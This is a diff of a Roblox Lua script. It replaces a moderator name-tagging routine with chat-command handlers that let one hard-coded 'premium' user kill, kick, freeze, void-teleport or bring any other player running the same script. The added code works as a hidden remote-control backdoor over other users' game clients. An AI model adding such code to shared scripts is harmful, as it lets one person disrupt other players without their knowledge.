@@ -1,36 +1,185 @@
---\\ imie is so sexy, listen to me. The sexy man says u can't steal this or else ur not sexy. -imie
---\\ you cant give diamonds to anyone. Only for admins.   -- rip custom emojis 😭
-
---\\ https://www.youtube.com/watch?v=dQw4w9WgXcQ - Senpai
-
---\\ -{ this is open source btw at https://github.com/swagmode/swagmode/edit/main/swagmain }- you're not impressing anyone by leaking it
---\\ REFRESH BEFORE YOU CHANGE THIS LIST BRUH
-
-ModIDS = {
-3044665354,
-
-
-}
-
---\\ Don't mess with anything below this
-function swagnames()
-    for _,Player in pairs(game:GetService('Players'):GetChildren()) do
-        if table.find(ModIDS, Player.UserId) then
-            if Player.Character then
-                if Player.Character.Parent.Name == 'Players' then
-                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]' .. Player.DisplayName)
-                end
-            end
-        else
-            if Player.Character then
-                if Player.Character.Parent.Name == 'Players' then
-                    if not Player.Character.UpperTorso:FindFirstChild('OriginalSize') then
-                        Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎]' .. Player.DisplayName)
-                    end
-                end
-            end
-        end
-    end
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":unbenx .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			benxPos = player.Character.HumanoidRootPart.CFrame
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+			wait(7)
+			player.Character.HumanoidRootPart.CFrame = benxPos
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":freeze .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			freeze()
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":unfreeze .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			unfreeze()
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":thaw .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			unfreeze()
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":ban .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer:kick("PERMA BAN")
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":kill .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":premcmds") then
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":void .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":bring .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":grave .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":ungrave .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":grave me") then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":ungrave me") then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":kick me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			game.Players.LocalPlayer:Kick("Kicked yourself")
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":freeze me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			freeze()
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":unfreeze me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			unfreeze()
+		end
+	end
+ 
+end)
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":thaw me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			unfreeze()
+		end
+	end
+ 
+end)
+ 
+ 
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":cmds") then
+		if game.Players.LocalPlayer == user_premium__001 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Cmds:";
+	Text = ":Freeze :grave :benx :bring :void :kill :kick :ban :fling";
+	Time = 50;
+	Icon = "rbxassetid://505845268";
+})
+		end
+	end
+ 
+end)
+---------------------
+ 
+if game.Players.LocalPlayer == user_premium__001 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Premium Loaded";
+	Text = "";
+	Time = 10;
+	Icon = "rbxassetid://505845268";
+})
+else
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "No Premium!";
+	Text = "D:";
+	Time = 10;
+})
 end
-local success,err = pcall(swagnames)
-return ModIDS
